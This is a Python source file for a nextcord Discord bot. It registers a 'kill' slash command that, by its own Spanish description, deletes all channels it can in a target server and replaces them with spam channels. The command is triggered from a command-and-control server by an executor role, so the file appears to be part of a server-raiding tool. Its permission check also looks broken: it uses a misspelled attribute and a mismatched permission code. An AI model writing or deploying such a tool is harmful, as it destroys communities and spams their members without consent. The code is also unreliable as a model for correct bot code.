import nextcord
from nextcord.ext import commands, application_checks
from nextcord import Interaction, SlashOption

from config.config_handler import ConfigHandler
from middlewares.server_verification import ServerVerification
from components.modals.kill_model import KillModel
from utils.server_utils import ServerUtils

class Kill(commands.Cog):
    
    config_handler = ConfigHandler()
    verifications = ServerVerification()
    utils = ServerUtils()
    
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        
    @nextcord.slash_command(
        name = "kill",
        description = "Elimina todos los canales que pueda y crea otros con spam.",
        guild_ids = config_handler.get_CaC_server_id()
    )
    
    @application_checks.has_role(config_handler.get_executor_rol_id())
    async def kill_command(self, ctx: Interaction, 
                    id: str = SlashOption(required = True, description = "Id del servidor objtivo.")):
        
        guild = self.utils.get_server(int(id), self.bot)
        
        self.verifications.check_command_execution_in_allowed_server(guild.id)
        self.verifications.check_bag(guild)
        
        if (not guild.me.guild_permissions.manage_channels
            and not guild.me.guild_permissions.administrador):
            
            raise commands.BotMissingPermissions(["268435456"])
        
        modal = KillModel(guild, self.bot)
        await ctx.response.send_modal(modal)
        
def setup(client):
    client.add_cog(Kill(client))